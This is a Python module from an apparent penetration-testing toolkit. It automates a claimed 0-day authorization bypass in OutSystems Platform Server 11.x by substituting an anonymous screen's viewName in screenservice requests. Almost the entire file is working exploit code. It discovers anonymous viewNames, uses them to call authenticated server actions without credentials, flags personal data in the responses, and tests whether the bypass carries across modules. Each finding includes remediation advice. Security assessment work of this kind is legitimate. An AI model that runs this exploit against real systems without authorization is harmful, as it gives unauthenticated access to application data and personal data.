"""
ViewNameBypassModule — OutSystems viewName Authorization Bypass (0-day)

CWE-863: Incorrect Authorization
CVSS 3.1: 8.1 - 9.1 (Network/Low/None/None/High/High/None)

Architectural flaw in OutSystems Platform Server 11.x:
The `viewName` parameter in screenservice POST requests is fully client-controlled.
OutSystems uses the viewName to determine which role-checks apply.
By substituting an anonymous screen's viewName, an attacker can call server
actions that require authenticated roles — without any credentials.

Original research: Adrian Martinez | HAAK Cybersecurity
Engagement: HAAK-2026-001 (Estafeta) — 28 findings, ATO active
"""
import re
import json
import time

from ..core import (
    BaseModule, OutSystemsTester, response_has_data,
    is_json_response, contains_pii, truncate,
)
from ..colors import (
    msg_ok, msg_fail, msg_info, msg_warn,
    msg_vuln, msg_vuln_detail, subsection, progress_bar,
)
from ..data.os_common import (
    COMMON_MODULES, ANONYMOUS_SCREENS, COMMON_ACTIONS,
    SENSITIVE_FIELDS,
)

# ─── Reference links for findings ────────────────────────────────────────────

REFERENCES = [
    "https://cwe.mitre.org/data/definitions/863.html",
    "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
    "https://success.outsystems.com/Documentation/11/Developing_an_Application/Secure_the_Application/",
]

# OutSystems error tokens that signal the viewName bypass FAILED
# (i.e. the server still enforced auth)
AUTH_REJECTED_SIGNALS = [
    "Invalid CSRF",
    "Session expired",
    "Not authorized",
    "Access denied",
    "NotAuthorized",
    "InvalidPermissions",
    "Unauthorized",
    "ForbiddenException",
    "InsufficientPermissions",
    "NoPermission",
    '"success":false',
    '"Success":false',
    "Login required",
    "authentication required",
]

# Patterns in a response that confirm data was returned (bypass worked)
DATA_SIGNALS = [
    '"data"',
    '"Data"',
    '"result"',
    '"Result"',
    '"list"',
    '"List"',
    '"record"',
    '"Record"',
    '"user"',
    '"User"',
    '"id"',
    '"Id"',
    '"email"',
    '"Email"',
]


class ViewNameBypassModule(BaseModule):
    NAME        = "viewname"
    DESCRIPTION = (
        "viewName authorization bypass — 0-day research finding. "
        "CWE-863 / OutSystems Platform 11.x"
    )

    def run(self) -> None:
        subsection("viewName Authorization Bypass (0-day)")
        msg_info(
            "Testing OutSystems viewName auth bypass — "
            "CWE-863 / HAAK original research"
        )

        modules_to_test = self._get_target_modules()
        if not modules_to_test:
            msg_warn("No OutSystems modules to test — run fingerprint first or use --module-name")
            return

        # If a specific viewName was provided on the CLI, use it directly
        forced_viewname = self.options.get("viewname_value")

        for module in modules_to_test:
            msg_info(f"Testing module: {module}")
            self._test_module(module, forced_viewname=forced_viewname)

    # ─── Per-module testing ───────────────────────────────────────────────────

    def _test_module(self, module: str, forced_viewname: str | None = None) -> None:
        """Full viewName bypass test for a single module."""

        # Step 1: Confirm the screenservice endpoint exists
        endpoint_exists = self._check_screenservice_exists(module)
        if not endpoint_exists:
            self._log(f"No screenservice endpoint for module: {module}")
            return

        msg_ok(f"  Screenservice endpoint confirmed: /{module}/screenservices/{module}")

        # Step 2: Find working anonymous viewNames
        if forced_viewname:
            anon_screens = [forced_viewname]
            msg_info(f"  Using forced viewName: {forced_viewname}")
        else:
            anon_screens = self._discover_anonymous_screens(module)

        if not anon_screens:
            self._log(f"  No anonymous screens found for {module}")
            self.finding(
                severity="info",
                title=f"No anonymous screens found in module: {module}",
                description=(
                    f"Tested {len(ANONYMOUS_SCREENS)} viewName candidates for module {module}. "
                    "None returned data without authentication. "
                    "Either the module has no anonymous screens or all are properly restricted."
                ),
                evidence=f"Module: {module}, tested {len(ANONYMOUS_SCREENS)} viewNames",
                cwe="CWE-863",
            )
            return

        # Step 3: Use anonymous viewNames to enumerate server actions
        for anon_vn in anon_screens:
            msg_warn(f"  Anonymous viewName confirmed: {anon_vn}")
            self._store_anonymous_screen(module, anon_vn)

            self.finding(
                severity="high",
                title=f"Anonymous viewName discovered: {module} / {anon_vn}",
                description=(
                    f"The viewName '{anon_vn}' in module '{module}' does not require "
                    "authentication. This viewName can be used in screenservice requests "
                    "to bypass role checks on other server actions."
                ),
                evidence=(
                    f"POST /{module}/screenservices/{module}/OnInitialize\n"
                    f'Body: {{"viewName": "{anon_vn}", "versionInfo": {{}}, '
                    f'"inputParameters": {{}}}}'
                ),
                request_data=self._request_summary(
                    "POST",
                    f"{self.tester.base_url}/{module}/screenservices/{module}/OnInitialize",
                    body={"viewName": anon_vn},
                ),
                remediation=(
                    "Implement server-side role verification independent of viewName. "
                    "Server actions should validate the caller's session roles directly, "
                    "not rely on the client-supplied viewName for access control decisions. "
                    "Apply OutSystems 'Roles' built-in functions (CheckRole, Check<RoleName>Role) "
                    "inside each server action."
                ),
                cwe="CWE-863",
                references=REFERENCES,
            )

            # Step 4: Enumerate server actions using this bypass
            self._enumerate_actions_with_bypass(module, anon_vn)
            break  # One confirmed bypass is enough to enumerate all actions

    # ─── Screen discovery ─────────────────────────────────────────────────────

    def _check_screenservice_exists(self, module: str) -> bool:
        """
        Check if the screenservice endpoint exists for this module.
        A 405 (Method Not Allowed) or 200 on POST confirms it exists.
        A 404 means it does not.
        """
        url = f"{self.tester.base_url}/{module}/screenservices/{module}/OnInitialize"
        resp = self.tester.post(
            url,
            json={
                "versionInfo": {"moduleVersion": "", "apiVersion": "1"},
                "viewName": "",
                "inputParameters": {},
            },
            headers={"Content-Type": "application/json"},
        )
        if resp is None:
            return False
        # 404 = endpoint does not exist
        # Any other status including 400, 401, 403, 500 = endpoint exists
        return resp.status_code != 404

    def _discover_anonymous_screens(self, module: str) -> list[str]:
        """
        Probe each candidate viewName.
        A viewName is anonymous if calling OnInitialize with it returns
        HTTP 200 with a non-error JSON body.
        """
        confirmed = []
        total = len(ANONYMOUS_SCREENS)
        msg_info(f"  Probing {total} viewName candidates...")

        for i, vn in enumerate(ANONYMOUS_SCREENS):
            progress_bar(i + 1, total, label=vn[:30], width=20)
            resp = self.tester.call_screen_service(
                module=    module,
                action=    "OnInitialize",
                view_name= vn,
                payload=   {},
            )
            if resp is None:
                continue

            if self._is_bypass_success(resp):
                confirmed.append(vn)
                self._log(f"  BYPASS: {vn} -> HTTP {resp.status_code}")

        print()  # newline after progress bar
        return confirmed

    def _is_bypass_success(self, resp) -> bool:
        """
        Determine whether a screenservice response indicates a successful bypass.
        Criteria:
        1. HTTP 200
        2. Response body is JSON
        3. Body does not contain auth-rejection signals
        4. Body contains data signals (not empty)
        """
        if resp is None or resp.status_code != 200:
            return False

        body = resp.text or ""

        # Check for auth rejection signals
        for signal in AUTH_REJECTED_SIGNALS:
            if signal.lower() in body.lower():
                return False

        # Must be parseable JSON
        if not is_json_response(resp):
            # OutSystems sometimes returns JSON without content-type header
            if not body.strip().startswith("{"):
                return False

        # Must contain at least one data signal
        has_data = any(sig in body for sig in DATA_SIGNALS)
        if not has_data:
            # Even a small JSON response with no error is interesting
            try:
                parsed = resp.json()
                # {} or {"success": true} without data still shows no error
                if isinstance(parsed, dict) and not any(
                    k.lower() in ("error", "exception", "message")
                    for k in parsed.keys()
                ):
                    return True
            except Exception:
                return False

        return has_data

    # ─── Action enumeration ───────────────────────────────────────────────────

    def _enumerate_actions_with_bypass(
        self,
        module:   str,
        view_name: str,
    ) -> None:
        """
        Use the confirmed anonymous viewName to enumerate server actions.
        For each action that responds with data, report as CRITICAL bypass.
        """
        msg_info(f"  Enumerating {len(COMMON_ACTIONS)} server actions via bypass...")
        bypassed_actions = []
        pii_actions = []
        total = len(COMMON_ACTIONS)

        for i, action in enumerate(COMMON_ACTIONS):
            progress_bar(i + 1, total, label=action[:30], width=20)
            resp = self.tester.call_screen_service(
                module=    module,
                action=    action,
                view_name= view_name,
                payload=   {},
            )
            if resp is None:
                continue

            status = resp.status_code
            body   = resp.text or ""

            if status == 404:
                continue  # action doesn't exist

            if status in (400, 422):
                # Action exists but returned parameter error — it's there
                bypassed_actions.append((action, status, "exists_param_error", ""))
                continue

            if status == 200 and self._is_bypass_success(resp):
                # Full bypass confirmed
                pii = contains_pii(body)
                evidence_snippet = truncate(body, 400)
                bypassed_actions.append((action, status, "bypass_confirmed", evidence_snippet))
                if pii:
                    pii_actions.append((action, pii, evidence_snippet))
                self._log(f"    BYPASS CONFIRMED: {action} (HTTP 200, data returned)")

        print()  # newline after progress bar

        # Register enumerated actions
        if module not in self.tester.os_server_actions:
            self.tester.os_server_actions[module] = []
        for action, _, _, _ in bypassed_actions:
            self.tester.os_server_actions[module].append(action)

        if not bypassed_actions:
            msg_info(f"  No actions accessible via bypass for {module}")
            return

        # Report bypassed actions
        confirmed_bypasses = [a for a in bypassed_actions if a[2] == "bypass_confirmed"]
        exists_only = [a for a in bypassed_actions if a[2] == "exists_param_error"]

        if confirmed_bypasses:
            action_list = ", ".join(a[0] for a in confirmed_bypasses)
            msg_vuln("critical", f"viewName bypass confirmed: {len(confirmed_bypasses)} actions accessible", module)

            self.finding(
                severity="critical",
                title=(
                    f"CRITICAL: viewName bypass — {len(confirmed_bypasses)} server actions "
                    f"accessible without authentication in {module}"
                ),
                description=(
                    f"Using anonymous viewName '{view_name}', the following server actions "
                    f"in module '{module}' are callable without authentication: "
                    f"{action_list}. "
                    "An unauthenticated attacker can invoke these actions and receive "
                    "application data. This is a platform-level architectural flaw "
                    "(CWE-863) in OutSystems Platform Server 11.x."
                ),
                evidence=(
                    f"Module: {module}\n"
                    f"Bypass viewName: {view_name}\n"
                    f"Accessible actions: {action_list}\n"
                    f"Sample response (first action): "
                    f"{confirmed_bypasses[0][3][:300] if confirmed_bypasses[0][3] else 'HTTP 200'}"
                ),
                request_data=self._request_summary(
                    "POST",
                    f"{self.tester.base_url}/{module}/screenservices/{module}/{confirmed_bypasses[0][0]}",
                    body={"viewName": view_name, "inputParameters": {}},
                ),
                response_data={
                    "status":  confirmed_bypasses[0][1],
                    "snippet": confirmed_bypasses[0][3][:500],
                },
                remediation=(
                    "1. Add explicit role verification inside each server action using "
                    "OutSystems built-in role functions (Check<RoleName>Role or CheckRole). "
                    "2. Do NOT rely solely on screen-level role assignment — server actions "
                    "must independently verify authorization. "
                    "3. Review OutSystems documentation: 'Validate Permissions' pattern. "
                    "4. Apply input parameter validation independent of viewName. "
                    "5. Consider platform upgrade / hotfix from OutSystems support."
                ),
                cwe="CWE-863",
                references=REFERENCES,
            )

        if exists_only:
            action_list = ", ".join(a[0] for a in exists_only)
            self.finding(
                severity="medium",
                title=(
                    f"Server actions enumerated in {module} "
                    f"({len(exists_only)} actions respond to parameter errors)"
                ),
                description=(
                    f"The following server actions exist in module '{module}' but "
                    "returned parameter validation errors (HTTP 400/422) — indicating "
                    "they are callable but require specific input: "
                    f"{action_list}."
                ),
                evidence=f"Actions returning 400/422: {action_list}",
                request_data=self._request_summary(
                    "POST",
                    f"{self.tester.base_url}/{module}/screenservices/{module}/",
                    body={"viewName": view_name},
                ),
                remediation=(
                    "Implement server-side role verification in all server actions. "
                    "Returning parameter errors before checking authorization reveals "
                    "action existence to unauthenticated users."
                ),
                cwe="CWE-863",
                references=REFERENCES,
            )

        # PII exposure findings
        if pii_actions:
            for action, pii_types, snippet in pii_actions:
                pii_str = ", ".join(pii_types)
                msg_vuln(
                    "critical",
                    f"PII/sensitive data exposed via bypass: {action}",
                    f"types: {pii_str}",
                )
                self.finding(
                    severity="critical",
                    title=(
                        f"PII/sensitive data exposed via viewName bypass: "
                        f"{module}/{action}"
                    ),
                    description=(
                        f"Server action '{action}' in module '{module}' is accessible "
                        f"without authentication and returns sensitive data including: "
                        f"{pii_str}. "
                        "This constitutes a data breach vector."
                    ),
                    evidence=(
                        f"Action: {action}\n"
                        f"Sensitive data types detected: {pii_str}\n"
                        f"Response snippet: {snippet[:400]}"
                    ),
                    remediation=(
                        "IMMEDIATE: Block access to this action until server-side "
                        "authorization is implemented. "
                        "Notify DPO/legal of potential data exposure. "
                        "Review access logs for unauthorized access."
                    ),
                    cwe="CWE-863",
                    references=REFERENCES + ["https://cwe.mitre.org/data/definitions/200.html"],
                )

        # Cross-module boundary test
        self._test_cross_module_boundary(module, view_name)

    # ─── Cross-module boundary ────────────────────────────────────────────────

    def _test_cross_module_boundary(
        self,
        source_module: str,
        view_name:     str,
    ) -> None:
        """
        Test whether a viewName from module A can be used to bypass
        auth on module B's server actions.
        If true, the bypass escapes module scope — severity escalation.
        """
        other_modules = [
            m for m in self.tester.os_modules
            if m != source_module
        ][:5]  # limit to 5 cross-module tests

        if not other_modules:
            return

        self._log(f"Cross-module boundary test: {source_module} viewName against {other_modules}")

        for target_module in other_modules:
            # Try calling a basic action in target module using source module's viewName
            resp = self.tester.call_screen_service(
                module=    target_module,
                action=    "OnInitialize",
                view_name= view_name,
                payload=   {},
            )
            if resp and resp.status_code == 200 and self._is_bypass_success(resp):
                msg_vuln(
                    "critical",
                    f"Cross-module viewName bypass: {source_module} -> {target_module}",
                )
                self.finding(
                    severity="critical",
                    title=(
                        f"Cross-module viewName bypass: "
                        f"{source_module} viewName accesses {target_module}"
                    ),
                    description=(
                        f"The anonymous viewName '{view_name}' from module '{source_module}' "
                        f"successfully bypasses authorization in module '{target_module}'. "
                        "This means the bypass is not scoped to the originating module — "
                        "it can be used to access server actions across all OutSystems modules "
                        "on this platform."
                    ),
                    evidence=(
                        f"Source viewName: {view_name} (from {source_module})\n"
                        f"Target module: {target_module}\n"
                        f"Result: HTTP {resp.status_code} with data"
                    ),
                    remediation=(
                        "This is a platform-level architectural flaw. "
                        "Authorization must be enforced independently within each server action "
                        "regardless of viewName origin. "
                        "Contact OutSystems Support for a platform-level fix."
                    ),
                    cwe="CWE-863",
                    references=REFERENCES,
                )

    # ─── Helpers ──────────────────────────────────────────────────────────────

    def _get_target_modules(self) -> list[str]:
        """Return the list of modules to test."""
        # CLI override: specific module name
        if self.options.get("module_name"):
            return [self.options["module_name"]]

        # Modules discovered by fingerprint
        if self.tester.os_modules:
            return self.tester.os_modules

        # Fallback: try a small subset of common modules
        return COMMON_MODULES[:15]

    def _store_anonymous_screen(self, module: str, view_name: str) -> None:
        """Record an anonymous screen in both tester state and per-module list."""
        if view_name not in self.tester.os_anonymous_screens:
            self.tester.os_anonymous_screens.append(view_name)
        if module not in self.tester.os_screens:
            self.tester.os_screens[module] = []
        if view_name not in self.tester.os_screens[module]:
            self.tester.os_screens[module].append(view_name)
